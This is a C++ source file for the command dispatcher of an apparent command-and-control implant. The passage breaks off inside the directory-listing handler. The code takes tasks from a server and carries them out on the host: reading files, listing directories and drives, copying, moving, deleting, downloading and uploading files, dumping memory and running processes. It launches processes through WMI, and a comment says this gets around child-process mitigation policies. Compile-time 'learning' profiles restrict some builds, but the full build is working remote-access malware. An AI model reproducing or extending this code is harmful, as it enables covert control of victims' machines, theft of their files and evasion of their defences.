// 文件作用：命令分发器实现：把服务端下发的 opcode 分派到 hello、目录、文件、进程等命令处理函数。
#include "Commander.h"
#include <wbemcli.h>


static ULONG ReadLE32(const BYTE* data)
{
	return ((ULONG)data[0]) | (((ULONG)data[1]) << 8) | (((ULONG)data[2]) << 16) | (((ULONG)data[3]) << 24);
}

static VOID WriteLE32(BYTE* data, ULONG value)
{
	data[0] = (BYTE)(value & 0xff);
	data[1] = (BYTE)((value >> 8) & 0xff);
	data[2] = (BYTE)((value >> 16) & 0xff);
	data[3] = (BYTE)((value >> 24) & 0xff);
}

static BOOL StartsWithA(const CHAR* value, const CHAR* prefix)
{
	if (!value || !prefix)
		return FALSE;
	while (*prefix) {
		if (*value++ != *prefix++)
			return FALSE;
	}
	return TRUE;
}

#define DIRECT_HTTPS_DIAG_PIPE_CREATE       0x00010000UL
#define DIRECT_HTTPS_DIAG_HANDLE_LIST       0x00020000UL
#define DIRECT_HTTPS_DIAG_CREATE_PROCESS    0x00040000UL
#define DIRECT_HTTPS_DIAG_BREAKAWAY         0x00080000UL
#define DIRECT_HTTPS_DIAG_TOKEN_OPEN        0x00100000UL
#define DIRECT_HTTPS_DIAG_AS_USER           0x00200000UL
#define DIRECT_HTTPS_DIAG_FALLBACK_CREATE   0x00400000UL
#define DIRECT_HTTPS_DIAG_FALLBACK_BREAKAWAY 0x00800000UL
#define DIRECT_HTTPS_DIAG_FALLBACK_AS_USER  0x01000000UL
#define DIRECT_HTTPS_DIAG_FALLBACK_FILE     0x02000000UL
#define DIRECT_HTTPS_DIAG_SHELL_EXECUTE     0x04000000UL
#define DIRECT_HTTPS_DIAG_TOKEN_LAUNCH      0x08000000UL
#define DIRECT_HTTPS_DIAG_NATIVE_PARAMS    0x10000000UL
#define DIRECT_HTTPS_DIAG_NATIVE_CREATE    0x20000000UL
#define DIRECT_HTTPS_DIAG_RTL_PARAMS       0x40000000UL
#define DIRECT_HTTPS_DIAG_RTL_CREATE       0x80000000UL
#define DIRECT_HTTPS_DIAG_WMI_ROUTE        0x00008000UL
#define DIRECT_HTTPS_NATIVE_SYNCHRONIZE_ACCESS 0x00100000UL

static ULONG DirectHttpsAsciiLength(const CHAR* value)
{
	ULONG length = 0;
	if (!value)
		return 0;
	while (value[length])
		length++;
	return length;
}

static BOOL DirectHttpsAsciiToWide(const CHAR* source, WCHAR* target, ULONG targetChars)
{
	if (!source || !target || targetChars == 0)
		return FALSE;
	ULONG length = DirectHttpsAsciiLength(source);
	if (length + 1 > targetChars)
		return FALSE;
	for (ULONG i = 0; i < length; i++)
		target[i] = (WCHAR)(BYTE)source[i];
	target[length] = L'\0';
	return TRUE;
}

static ULONG DirectHttpsVariantDword(const VARIANT* value)
{
	if (!value)
		return 0;
	switch (value->vt & VT_TYPEMASK) {
	case VT_I1: return (ULONG)value->cVal;
	case VT_UI1: return (ULONG)value->bVal;
	case VT_I2: return (ULONG)value->iVal;
	case VT_UI2: return (ULONG)value->uiVal;
	case VT_I4: return (ULONG)value->lVal;
	case VT_UI4: return (ULONG)value->ulVal;
	default: return 0;
	}
}

static DWORD DirectHttpsHresultError(HRESULT value)
{
	DWORD error = ((DWORD)value) & 0x0000ffffUL;
	return error ? error : ERROR_GEN_FAILURE;
}

// Ask the WMI service to create the command process. WPP/WPS main hosts in
// this fixture carry the child-process mitigation policy, while the WMI
// provider is an existing system broker and can create the same user command.
static BOOL DirectHttpsRunViaWmi(
	const CHAR* commandLine,
	const CHAR* currentDirectory,
	DWORD* processId,
	HANDLE* processHandle,
	DWORD* errorCode)
{
	if (processId)
		*processId = 0;
	if (processHandle)
		*processHandle = NULL;
	if (errorCode)
		*errorCode = ERROR_CALL_NOT_IMPLEMENTED;

	if (!commandLine || !processId || !processHandle || !errorCode ||
		!ApiWin || !ApiWin->CoInitializeEx || !ApiWin->CoInitializeSecurity ||
		!ApiWin->CoCreateInstance || !ApiWin->CoSetProxyBlanket ||
		!ApiWin->CoUninitialize || !ApiWin->SysAllocString ||
		!ApiWin->SysFreeString || !ApiWin->VariantInit ||
		!ApiWin->VariantClear || !ApiWin->OpenProcess)
		return FALSE;

	ULONG commandChars = DirectHttpsAsciiLength(commandLine);
	ULONG directoryChars = DirectHttpsAsciiLength(currentDirectory);
	WCHAR* commandWide = (WCHAR*)MemAllocLocal((commandChars + 1) * sizeof(WCHAR));
	WCHAR* directoryWide = directoryChars ?
		(WCHAR*)MemAllocLocal((directoryChars + 1) * sizeof(WCHAR)) : NULL;
	if (!commandWide || (directoryChars && !directoryWide) ||
		!DirectHttpsAsciiToWide(commandLine, commandWide, commandChars + 1) ||
		(directoryChars && !DirectHttpsAsciiToWide(currentDirectory, directoryWide, directoryChars + 1))) {
		if (commandWide)
			MemFreeLocal((LPVOID*)&commandWide, (commandChars + 1) * sizeof(WCHAR));
		if (directoryWide)
			MemFreeLocal((LPVOID*)&directoryWide, (directoryChars + 1) * sizeof(WCHAR));
		*errorCode = ERROR_NOT_ENOUGH_MEMORY;
		return FALSE;
	}

	BOOL success = FALSE;
	BOOL comInitialized = FALSE;
	HRESULT hr = S_OK;
	IWbemLocator* locator = NULL;
	IWbemServices* services = NULL;
	IWbemClassObject* processClass = NULL;
	IWbemClassObject* inputSignature = NULL;
	IWbemClassObject* inputParams = NULL;
	IWbemClassObject* outputParams = NULL;
	BSTR namespaceName = NULL;
	BSTR className = NULL;
	BSTR methodName = NULL;
	BSTR commandBstr = NULL;
	BSTR directoryBstr = NULL;
	VARIANT commandVariant;
	VARIANT directoryVariant;
	VARIANT returnVariant;
	VARIANT processVariant;
	BOOL commandVariantReady = FALSE;
	BOOL directoryVariantReady = FALSE;
	BOOL returnVariantReady = FALSE;
	BOOL processVariantReady = FALSE;

	static const CLSID clsidWbemLocator = {
		0x4590f811, 0x1d3a, 0x11d0,
		{ 0x89, 0x1f, 0x00, 0xaa, 0x00, 0x4b, 0x2e, 0x24 }
	};
	static const IID iidWbemLocator = {
		0xdc12a687, 0x737f, 0x11cf,
		{ 0x88, 0x4d, 0x00, 0xaa, 0x00, 0x4b, 0x2e, 0x24 }
	};

	hr = ApiWin->CoInitializeEx(NULL, COINIT_MULTITHREADED);
	if (SUCCEEDED(hr))
		comInitialized = TRUE;
	else if (hr == RPC_E_CHANGED_MODE)
		hr = S_OK;

	if (SUCCEEDED(hr)) {
		do {
			hr = ApiWin->CoInitializeSecurity(
				NULL,
				-1,
				NULL,
				NULL,
				RPC_C_AUTHN_LEVEL_DEFAULT,
				RPC_C_IMP_LEVEL_IMPERSONATE,
				NULL,
				EOAC_NONE,
				NULL);
			if (FAILED(hr) && hr != RPC_E_TOO_LATE)
				break;

			hr = ApiWin->CoCreateInstance(
				clsidWbemLocator,
				NULL,
				CLSCTX_INPROC_SERVER,
				iidWbemLocator,
				(LPVOID*)&locator);
			if (FAILED(hr) || !locator)
				break;

			namespaceName = ApiWin->SysAllocString(L"ROOT\\CIMV2");
			if (!namespaceName)
				break;
			hr = locator->ConnectServer(namespaceName, NULL, NULL, NULL, 0, NULL, NULL, &services);
			if (FAILED(hr) || !services)
				break;
			hr = ApiWin->CoSetProxyBlanket(
				(IUnknown*)services,
				RPC_C_AUTHN_WINNT,
				RPC_C_AUTHZ_NONE,
				NULL,
				RPC_C_AUTHN_LEVEL_CALL,
				RPC_C_IMP_LEVEL_IMPERSONATE,
				NULL,
				EOAC_NONE);
			if (FAILED(hr))
				break;

			className = ApiWin->SysAllocString(L"Win32_Process");
			methodName = ApiWin->SysAllocString(L"Create");
			if (!className || !methodName)
				break;
			hr = services->GetObject(className, 0, NULL, &processClass, NULL);
			if (FAILED(hr) || !processClass)
				break;
			hr = processClass->GetMethod(methodName, 0, &inputSignature, NULL);
			if (FAILED(hr) || !inputSignature)
				break;
			hr = inputSignature->SpawnInstance(0, &inputParams);
			if (FAILED(hr) || !inputParams)
				break;

			commandBstr = ApiWin->SysAllocString(commandWide);
			if (!commandBstr)
				break;
			ApiWin->VariantInit(&commandVariant);
			commandVariantReady = TRUE;
			commandVariant.vt = VT_BSTR;
			commandVariant.bstrVal = commandBstr;
			hr = inputParams->Put(L"CommandLine", 0, &commandVariant, CIM_STRING);
			if (FAILED(hr))
				break;

			if (directoryWide && directoryChars) {
				directoryBstr = ApiWin->SysAllocString(directoryWide);
				if (!directoryBstr)
					break;
				ApiWin->VariantInit(&directoryVariant);
				directoryVariantReady = TRUE;
				directoryVariant.vt = VT_BSTR;
				directoryVariant.bstrVal = directoryBstr;
				hr = inputParams->Put(L"CurrentDirectory", 0, &directoryVariant, CIM_STRING);
				if (FAILED(hr))
					break;
			}

			hr = services->ExecMethod(className, methodName, 0, NULL, inputParams, &outputParams, NULL);
			if (FAILED(hr) || !outputParams)
				break;

			ApiWin->VariantInit(&returnVariant);
			returnVariantReady = TRUE;
			hr = outputParams->Get(L"ReturnValue", 0, &returnVariant, NULL, NULL);
			if (FAILED(hr) || DirectHttpsVariantDword(&returnVariant) != 0) {
				*errorCode = SUCCEEDED(hr) ? DirectHttpsVariantDword(&returnVariant) : DirectHttpsHresultError(hr);
				if (!*errorCode)
					*errorCode = ERROR_GEN_FAILURE;
				break;
			}

			ApiWin->VariantInit(&processVariant);
			processVariantReady = TRUE;
			hr = outputParams->Get(L"ProcessId", 0, &processVariant, NULL, NULL);
			if (FAILED(hr))
				break;
			*processId = DirectHttpsVariantDword(&processVariant);
			if (!*processId)
				break;

			*processHandle = ApiWin->OpenProcess(
				PROCESS_QUERY_INFORMATION | PROCESS_TERMINATE | SYNCHRONIZE,
				FALSE,
				*processId);
			if (!*processHandle)
				*processHandle = ApiWin->OpenProcess(
					PROCESS_QUERY_LIMITED_INFORMATION | SYNCHRONIZE,
					FALSE,
					*processId);
			if (!*processHandle) {
				*errorCode = ApiWin->GetLastError ? ApiWin->GetLastError() : ERROR_ACCESS_DENIED;
				break;
			}
			success = TRUE;
		} while (FALSE);
	}

	if (!success && !*errorCode)
		*errorCode = FAILED(hr) ? DirectHttpsHresultError(hr) : ERROR_GEN_FAILURE;
	if (processVariantReady)
		ApiWin->VariantClear(&processVariant);
	if (returnVariantReady)
		ApiWin->VariantClear(&returnVariant);
	if (directoryVariantReady)
		ApiWin->VariantClear(&directoryVariant);
	if (commandVariantReady)
		ApiWin->VariantClear(&commandVariant);
	if (outputParams)
		outputParams->Release();
	if (inputParams)
		inputParams->Release();
	if (inputSignature)
		inputSignature->Release();
	if (processClass)
		processClass->Release();
	if (services)
		services->Release();
	if (locator)
		locator->Release();
	if (namespaceName)
		ApiWin->SysFreeString(namespaceName);
	if (className)
		ApiWin->SysFreeString(className);
	if (methodName)
		ApiWin->SysFreeString(methodName);
	if (commandBstr && !commandVariantReady)
		ApiWin->SysFreeString(commandBstr);
	if (directoryBstr && !directoryVariantReady)
		ApiWin->SysFreeString(directoryBstr);
	if (comInitialized)
		ApiWin->CoUninitialize();
	if (commandWide)
		MemFreeLocal((LPVOID*)&commandWide, (commandChars + 1) * sizeof(WCHAR));
	if (directoryWide)
		MemFreeLocal((LPVOID*)&directoryWide, (directoryChars + 1) * sizeof(WCHAR));
	return success;
}

static ULONG SelfC2CommandFromAction(ULONG actionId)
{
	switch (actionId) {
	case SELF_C2_ACTION_HELLO: return COMMAND_HELLO;
#if !DIRECT_HTTPS_LEARNING_MINIMAL || DIRECT_HTTPS_FILE_COMMANDS_ONLY
#if !DIRECT_HTTPS_FILE_COMMANDS_ONLY
	case SELF_C2_ACTION_RUN_PROCESS: return COMMAND_PS_RUN;
#endif
	case SELF_C2_ACTION_PWD: return COMMAND_PWD;
	case SELF_C2_ACTION_CD: return COMMAND_CD;
	case SELF_C2_ACTION_LS: return COMMAND_LS;
	case SELF_C2_ACTION_CAT: return COMMAND_CAT;
	case SELF_C2_ACTION_MKDIR: return COMMAND_MKDIR;
	case SELF_C2_ACTION_RM: return COMMAND_RM;
	case SELF_C2_ACTION_COPY: return COMMAND_CP;
	case SELF_C2_ACTION_MOVE: return COMMAND_MV;
	case SELF_C2_ACTION_DISKS: return COMMAND_DISKS;
#if !DIRECT_HTTPS_FILE_COMMANDS_ONLY
	case SELF_C2_ACTION_DOWNLOAD: return COMMAND_DOWNLOAD;
	case SELF_C2_ACTION_UPLOAD: return COMMAND_UPLOAD;
	case SELF_C2_ACTION_SAVE_MEMORY: return COMMAND_SAVEMEMORY;
#endif
#else
	/* The learning profile intentionally accepts only a harmless link test. */
#endif
	default: return 0;
	}
}

// Commander::operator new 使用本项目的内存分配函数创建命令分发器。
void* Commander::operator new(size_t sz) 
{
	void* p = MemAllocLocal(sz);
	return p;
}

// Commander::operator delete 释放命令分发器占用的本地内存。
void Commander::operator delete(void* p) noexcept 
{
	MemFreeLocal(&p, sizeof(Commander));
}

// Commander 构造函数保存 Agent 指针，方便命令处理时访问配置和状态。
Commander::Commander(Agent* a)
{
	this->agent = a;
}

// ProcessCommandTasks 解析服务端下发的任务包，并按 command id 调用对应命令函数。
void Commander::ProcessCommandTasks(BYTE* recv, ULONG recvSize, Packer* outPacker)
{
#if DIRECT_HTTPS_HELLO_ONLY
	// hello-only 只接受自研 LPT4 section 帧，避免重新启用旧 DHT2/legacy
	// 任务解析器。每条记录必须是无参数的 hello，其他 action 直接丢弃。
	if (!recv || !outPacker || recvSize < DIRECT_HTTPS_TASKS_V2_HEADER_SIZE ||
		recv[0] != SELF_C2_TASK_FRAME_V4_MAGIC0 || recv[1] != SELF_C2_TASK_FRAME_V4_MAGIC1 ||
		recv[2] != SELF_C2_TASK_FRAME_V4_MAGIC2 || recv[3] != SELF_C2_TASK_FRAME_V4_MAGIC3)
		return;

	ULONG schema = ReadLE32(recv + 4);
	ULONG flags = ReadLE32(recv + 8);
	ULONG taskCount = ReadLE32(recv + 12);
	ULONG bodyLen = ReadLE32(recv + 16);
	if (schema != DIRECT_HTTPS_TASKS_V2_SCHEMA ||
		(flags & DIRECT_HTTPS_ENVELOPE_FLAG_SECTIONED) == 0 ||
		bodyLen > recvSize - DIRECT_HTTPS_TASKS_V2_HEADER_SIZE || bodyLen < 4)
		return;

	BYTE* body = recv + DIRECT_HTTPS_TASKS_V2_HEADER_SIZE;
	ULONG sectionCount = ReadLE32(body);
	ULONG cursor = 4;
	ULONG recordCount = 0;
	while (cursor < bodyLen) {
		if (cursor + 8 > bodyLen)
			return;
		ULONG sectionType = ReadLE32(body + cursor);
		ULONG sectionLen = ReadLE32(body + cursor + 4);
		cursor += 8;
		if (sectionLen > bodyLen - cursor)
			return;
		if (sectionType == SELF_C2_SECTION_TASK_RECORD_V4) {
			if (sectionLen < 16)
				return;
			ULONG recordSchema = ReadLE32(body + cursor);
			ULONG taskId = ReadLE32(body + cursor + 4);
			ULONG actionId = ReadLE32(body + cursor + 8);
			ULONG argLen = ReadLE32(body + cursor + 12);
			if (recordSchema != SELF_C2_TASK_RECORD_V4_SCHEMA ||
				actionId != SELF_C2_ACTION_HELLO || argLen != 0 || argLen > sectionLen - 16)
				return;
			recordCount++;
		}
		cursor += sectionLen;
		if (recordCount > taskCount)
			return;
	}
	if (cursor != bodyLen || sectionCount == 0 || recordCount != taskCount)
		return;

	cursor = 4;
	while (cursor < bodyLen) {
		ULONG sectionType = ReadLE32(body + cursor);
		ULONG sectionLen = ReadLE32(body + cursor + 4);
		cursor += 8;
		if (sectionType == SELF_C2_SECTION_TASK_RECORD_V4) {
			ULONG taskId = ReadLE32(body + cursor + 4);
			BYTE taskBytes[4];
			WriteLE32(taskBytes, taskId);
			Packer taskPacker(taskBytes, sizeof(taskBytes));
			this->CmdHello(COMMAND_HELLO, &taskPacker, outPacker);
		}
		cursor += sectionLen;
	}
	return;
#else
	if (!recv || recvSize < 8)
		return;

	Packer* inPacker = NULL;
	BYTE* nativeBody = NULL;
	ULONG nativeLen = 0;
	ULONG parseLimit = 0;
	ULONG taskCount = 0;
	BOOL useV2Envelope = FALSE;

	if (recvSize >= DIRECT_HTTPS_TASKS_V2_HEADER_SIZE &&
		((recv[0] == 'D' && recv[1] == 'H' && recv[2] == 'T' && recv[3] == '2') || (recv[0] == SELF_C2_TASK_FRAME_V4_MAGIC0 && recv[1] == SELF_C2_TASK_FRAME_V4_MAGIC1 && recv[2] == SELF_C2_TASK_FRAME_V4_MAGIC2 && recv[3] == SELF_C2_TASK_FRAME_V4_MAGIC3))) {
		Packer* headerPacker = new Packer(recv + 4, recvSize - 4);
		ULONG schema = headerPacker->Unpack32();
		ULONG flags = headerPacker->Unpack32();
		taskCount = headerPacker->Unpack32();
		ULONG bodyLen = headerPacker->Unpack32();
		delete headerPacker;

		if (schema != DIRECT_HTTPS_TASKS_V2_SCHEMA || bodyLen > recvSize - DIRECT_HTTPS_TASKS_V2_HEADER_SIZE)
			return;

		BYTE* bodyData = recv + DIRECT_HTTPS_TASKS_V2_HEADER_SIZE;
		if ((flags & DIRECT_HTTPS_ENVELOPE_FLAG_SECTIONED) != 0) {
			if (bodyLen < 4)
				return;
			ULONG sectionCount = ReadLE32(bodyData);
			ULONG cursor = 4;
			BYTE* legacyBody = NULL;
			ULONG legacyLen = 0;
			ULONG nativeTotalLen = 0;

			for (ULONG i = 0; i < sectionCount; i++) {
				if (cursor + 8 > bodyLen)
					return;
				ULONG sectionType = ReadLE32(bodyData + cursor);
				ULONG sectionLen = ReadLE32(bodyData + cursor + 4);
				cursor += 8;
				if (sectionLen > bodyLen - cursor)
					return;
				if (sectionType == DIRECT_HTTPS_SECTION_LEGACY_RECORDS) {
					legacyBody = bodyData + cursor;
					legacyLen = sectionLen;
				}
				else if (sectionType == SELF_C2_SECTION_TASK_RECORD_V4) {
					if (sectionLen < 16)
						return;
					ULONG argLen = ReadLE32(bodyData + cursor + 12);
					if (argLen > sectionLen - 16)
						return;
					nativeTotalLen += 8 + argLen;
				}
				cursor += sectionLen;
			}

			if (!legacyBody && nativeTotalLen > 0) {
				nativeBody = (BYTE*)MemAllocLocal(nativeTotalLen);
				nativeLen = nativeTotalLen;
				ULONG outCursor = 0;
				cursor = 4;
				for (ULONG i = 0; i < sectionCount; i++) {
					ULONG sectionType = ReadLE32(bodyData + cursor);
					ULONG sectionLen = ReadLE32(bodyData + cursor + 4);
					cursor += 8;
					if (sectionType == SELF_C2_SECTION_TASK_RECORD_V4) {
						ULONG recordSchema = ReadLE32(bodyData + cursor);
						ULONG taskId = ReadLE32(bodyData + cursor + 4);
						ULONG actionId = ReadLE32(bodyData + cursor + 8);
						ULONG argLen = ReadLE32(bodyData + cursor + 12);
						ULONG commandId = SelfC2CommandFromAction(actionId);
						if (recordSchema != SELF_C2_TASK_RECORD_V4_SCHEMA || commandId == 0 || outCursor + 8 + argLen > nativeLen) {
							MemFreeLocal((LPVOID*)&nativeBody, nativeLen);
							nativeBody = NULL;
							return;
						}
						WriteLE32(nativeBody + outCursor, commandId);
						outCursor += 4;
						if (argLen > 0) {
							memcpy(nativeBody + outCursor, bodyData + cursor + 16, argLen);
							outCursor += argLen;
						}
						WriteLE32(nativeBody + outCursor, taskId);
						outCursor += 4;
					}
					cursor += sectionLen;
				}
				legacyBody = nativeBody;
				legacyLen = nativeLen;
			}

			if (!legacyBody)
				return;
			inPacker = new Packer(legacyBody, legacyLen);
			parseLimit = legacyLen;
		}
		else {
			inPacker = new Packer(bodyData, bodyLen);
			parseLimit = bodyLen;
		}
		useV2Envelope = TRUE;
	}
	else {
		Packer* legacyPacker = new Packer(recv, recvSize);
		ULONG packerSize = legacyPacker->Unpack32();
		if (packerSize > recvSize - 4) {
			delete legacyPacker;
			return;
		}
		inPacker = legacyPacker;
		parseLimit = packerSize + 4;
	}

	ULONG parsedTasks = 0;
	while (inPacker && inPacker->datasize() < parseLimit)
	{
		if (useV2Envelope && taskCount > 0 && parsedTasks >= taskCount)
			break;

		ULONG CommandId = inPacker->Unpack32();
		switch (CommandId)
		{
		// file-commands-only 档保留目录和文件 CRUD；进程与传输任务只在完整档分发。
		case COMMAND_HELLO:
			this->CmdHello(CommandId, inPacker, outPacker); break;
		case COMMAND_CAT:
		#if !DIRECT_HTTPS_LEARNING_MINIMAL || DIRECT_HTTPS_FILE_COMMANDS_ONLY
			this->CmdCat(CommandId, inPacker, outPacker); break;
		case COMMAND_CD:
			this->CmdCd(CommandId, inPacker, outPacker); break;
		case COMMAND_CP:
			this->CmdCp(CommandId, inPacker, outPacker); break;
		#if !DIRECT_HTTPS_FILE_COMMANDS_ONLY
		case COMMAND_DOWNLOAD:
			this->CmdDownload(CommandId, inPacker, outPacker); break;
		#endif
		case COMMAND_LS:
			this->CmdLs(CommandId, inPacker, outPacker); break;
		case COMMAND_DISKS:
			this->CmdDisks(CommandId, inPacker, outPacker); break;
		case COMMAND_MV:
			this->CmdMv(CommandId, inPacker, outPacker); break;
		case COMMAND_MKDIR:
			this->CmdMkdir(CommandId, inPacker, outPacker); break;
		#if !DIRECT_HTTPS_FILE_COMMANDS_ONLY
		case COMMAND_PS_RUN:
			this->CmdPsRun(CommandId, inPacker, outPacker); break;
		#endif
		case COMMAND_PWD:
			this->CmdPwd(CommandId, inPacker, outPacker); break;
		case COMMAND_RM:
			this->CmdRm(CommandId, inPacker, outPacker); break;
		#if !DIRECT_HTTPS_FILE_COMMANDS_ONLY
		case COMMAND_UPLOAD:
			this->CmdUpload(CommandId, inPacker, outPacker); break;
		case COMMAND_SAVEMEMORY:
			this->CmdSaveMemory(CommandId, inPacker, outPacker); break;
		#endif
		#endif
		default: break;
		}
		parsedTasks++;
	}
	if (inPacker)
		delete inPacker;
	if (nativeBody)
		MemFreeLocal((LPVOID*)&nativeBody, nativeLen);
#endif
}

#if !DIRECT_HTTPS_HELLO_ONLY
// CmdCat 读取指定文件内容，并把结果打包回传。
void Commander::CmdCat(ULONG commandId, Packer* inPacker, Packer* outPacker)
{
	ULONG pathSize = 0;
	CHAR* path     = (CHAR*)inPacker->UnpackBytes(&pathSize);
	ULONG taskId   = inPacker->Unpack32();

	outPacker->Pack32(taskId);

	HANDLE hFile = ApiWin->CreateFileA(path, GENERIC_READ, 0, 0, OPEN_EXISTING, 0, 0);
	if ( !hFile || hFile == INVALID_HANDLE_VALUE ) {
		outPacker->Pack32(COMMAND_ERROR);
		outPacker->Pack32(TEB->LastErrorValue);
		return;
	}

	DWORD contentSize = 2048;
	DWORD readed = 0;
	PVOID content = MemAllocLocal(contentSize);

	BOOL result = ApiWin->ReadFile(hFile, content, contentSize, &readed, NULL);
	if (result) {
		outPacker->Pack32(commandId);
		outPacker->PackBytes((PBYTE)path, pathSize);
		outPacker->PackBytes((PBYTE)content, readed);
	}
	else {
		outPacker->Pack32(COMMAND_ERROR);
		outPacker->Pack32(TEB->LastErrorValue);
	}

	if (hFile) {
		ApiNt->NtClose(hFile);
		hFile = NULL;
	}

	if (content)
		MemFreeLocal(&content, contentSize);
}

// CmdCd 切换 agent 当前工作目录。
void Commander::CmdCd(ULONG commandId, Packer* inPacker, Packer* outPacker)
{
	ULONG pathSize = 0;
	CHAR* path     = (CHAR*) inPacker->UnpackBytes(&pathSize);
	ULONG taskId   = inPacker->Unpack32();

	outPacker->Pack32(taskId);

	BOOL result = ApiWin->SetCurrentDirectoryA(path);
	if (result) {
		CHAR  currentPath[MAX_PATH] = { 0 };
		ULONG currentPathSize = ApiWin->GetCurrentDirectoryA(MAX_PATH, currentPath);
		outPacker->Pack32(commandId);
		outPacker->PackBytes((PBYTE)currentPath, currentPathSize);
	}
	else {
		outPacker->Pack32(COMMAND_ERROR);
		outPacker->Pack32(TEB->LastErrorValue);
	}
}

// CmdCp 复制文件。
void Commander::CmdCp(ULONG commandId, Packer* inPacker, Packer* outPacker)
{
	ULONG srcSize = 0;
	CHAR* src     = (CHAR*) inPacker->UnpackBytes(&srcSize);
	ULONG dstSize = 0;
	CHAR* dst     = (CHAR*) inPacker->UnpackBytes(&dstSize);
	ULONG taskId  = inPacker->Unpack32();

	outPacker->Pack32(taskId);

	BOOL result = ApiWin->CopyFileA(src, dst, FALSE);
	if (result) {
		outPacker->Pack32(commandId);
	}      
	else {
		outPacker->Pack32(COMMAND_ERROR);
		outPacker->Pack32(TEB->LastErrorValue);
	}
}

// CmdDisks 枚举当前进程可见的逻辑磁盘，并返回 Win32 驱动器类型。
void Commander::CmdDisks(ULONG commandId, Packer* inPacker, Packer* outPacker)
{
	ULONG taskId = inPacker->Unpack32();
	outPacker->Pack32(taskId);
	outPacker->Pack32(commandId);

	ULONG drives = ApiWin->GetLogicalDrives();
	if (drives == 0) {
		outPacker->Pack8(FALSE);
		outPacker->Pack32(TEB->LastErrorValue);
		return;
	}

	outPacker->Pack8(TRUE);
	ULONG count = 0;
	ULONG countOffset = outPacker->datasize();
	outPacker->Pack32(0);
	for (CHAR drive = 'A'; drive <= 'Z'; ++drive) {
		if ((drives & (1UL << (drive - 'A'))) == 0)
			continue;
		CHAR drivePath[] = { drive, ':', '\\', '\0' };
		ULONG driveType = ApiWin->GetDriveTypeA(drivePath);
		outPacker->Pack8((BYTE)drive);
		outPacker->Pack32(driveType);
		count++;
	}
	outPacker->Set32(countOffset, count);
}

// CmdDownload 打开文件并创建下载任务，后续由 Downloader 分块回传。
void Commander::CmdDownload(ULONG commandId, Packer* inPacker, Packer* outPacker)
{
	ULONG filenameSize = 0;
	CHAR* filename     = (CHAR*) inPacker->UnpackBytes(&filenameSize);
	ULONG taskId       = inPacker->Unpack32();

	outPacker->Pack32(taskId);

	HANDLE hFile = ApiWin->CreateFileA(filename, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL);
	if (!hFile || hFile == INVALID_HANDLE_VALUE) {
		outPacker->Pack32(COMMAND_ERROR);
		outPacker->Pack32(TEB->LastErrorValue);
	}
	else {
		CHAR  fullPath[MAX_PATH];
		DWORD pathSize = ApiWin->GetFullPathNameA( filename, MAX_PATH, fullPath, NULL);
		DWORD fileSizeHigh = 0;
		DWORD fileSizeLow  = ApiWin->GetFileSize( hFile, &fileSizeHigh );
		ULONG64 fileSize   = ((ULONG64)fileSizeHigh << 32) | fileSizeLow;

		if (pathSize > 0) {
			DownloadData downloadData = this->agent->downloader->CreateDownloadData(taskId, hFile, fileSize);
			outPacker->Pack32(COMMAND_DOWNLOAD);
			outPacker->Pack32(downloadData.fileId);
			outPacker->Pack8(DOWNLOAD_START);
			outPacker->Pack64(downloadData.fileSize);
			outPacker->PackBytes((PBYTE)fullPath, pathSize);
		}
		else {
			outPacker->Pack32(COMMAND_ERROR);
			outPacker->Pack32(TEB->LastErrorValue);
		}
	}
}

#endif

// CmdHello 返回一段简单文本，用来验证 agent 命令链路是否通。
void Commander::CmdHello(ULONG commandId, Packer* inPacker, Packer* outPacker)
{
	ULONG taskId = inPacker->Unpack32();
	const CHAR message[] = "ok";

	outPacker->Pack32(taskId);
	outPacker->Pack32(commandId);
	outPacker->PackBytes((PBYTE)message, sizeof(message) - 1);
}

#if !DIRECT_HTTPS_HELLO_ONLY
// CmdJobsKill 根据 job id 终止正在运行的后台任务。
void Commander::CmdJobsKill(ULONG commandId, Packer* inPacker, Packer* outPacker)
{
	ULONG jobId = inPacker->Unpack32();
	ULONG taskId = inPacker->Unpack32();

	outPacker->Pack32(taskId);
	outPacker->Pack32(commandId);

	BOOL found = FALSE;
	ULONG count = agent->jober->jobs.size();
	for (int i = 0; i < count; i++) {
		if (jobId == agent->jober->jobs[i].jobId) {
			agent->jober->jobs[i].jobState = JOB_STATE_KILLED;
			found = TRUE;
			break;
		}
	}

	outPacker->Pack8(found);
	outPacker->Pack32(jobId);
}

// CmdLs 枚举目录文件，并把名称、大小、时间和属性打包给服务端。
void Commander::CmdLs(ULONG commandId, Packer* inPacker, Packer* outPacker)
{
	ULONG pathSize = 0;
	CHAR* path     = (CHAR*)inPacker->UnpackBytes(&pathSize);
	ULONG taskId   = inPacker->Unpack32();

	outPacker->Pack32(taskId);
	outPacker->Pack32(commandId);

	CHAR  fullpath[MAX_PATH];
	DWORD fullpathSize = MAX_PATH;

	if (pathSize == 3 && path[1] == ':') {
		fullpath[0] = path[0];
		fullpath[1] = path[1];
		fullpathSize = 2;
	}
	else {
		fullpathSize = ApiWin->GetFullPathNameA(path, MAX_PATH, fullpath, NULL);
		if (fullpathSize + 2 > MAX_PATH || fullpathSize == 0) {
			outPacker->Pack8(FALSE);
			outPacker->Pack32(TEB->LastErrorValue);
			return;
		}
	}

	DWORD fileAttribs = ApiWin->GetFileAttributesA(fullpath);
	BOOL isFile = (fileAttribs != INVALID_FILE_ATTRIBUTES) && !(fileAttribs & FILE_ATTRIBUTE_DIRECTORY);
	if (!isFile) {
		fullpath[fullpathSize] = '\\';
		fullpath[++fullpathSize] = '*';
		fullpath[++fullpathSize] = 0;
	}

	WIN32_FIND_DATAA findData = { 0 };
	HANDLE File = ApiWin->FindFirstFileA(fullpath, &findData);
	if ( File != INVALID_HANDLE_VALUE ) {
		outPacker->Pack8(TRUE);
		outPacker->PackStringA(fullpath);

		ULONG count = 0;
		ULONG indexCount = outPacker->datasize();
		outPacker->Pack32(0);

		do {
			BOOL isDir = (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) == FILE_ATTRIBUTE_DIRECTORY;
			
			if( isDir && StrLenA(findData.cFileName) == 1 && findData.cFileName[0] == 0x2e )
				continue;
			if (isDir && StrLenA(findData.cFileName) == 2 && findData.cFileName[0] == 0x2e && findData.cFileName[1] == 0x2e)
				continue;
			
			ULONG64 size = 0;
			((ULONG*)&size)[1] = findData.nFileSizeHigh;
			((ULONG*)&size)[0] = findData.nFileSizeLow;

			ULONG writeDate = FileTimeToUnixTimestamp(findData.ftLastWriteTime);

			outPacker->Pack8(isDir);
			outPacker->Pack64(size);
			outPacker->Pack32(writeDate);
			outPacker->PackStringA(findData.cFileName);

			count++;

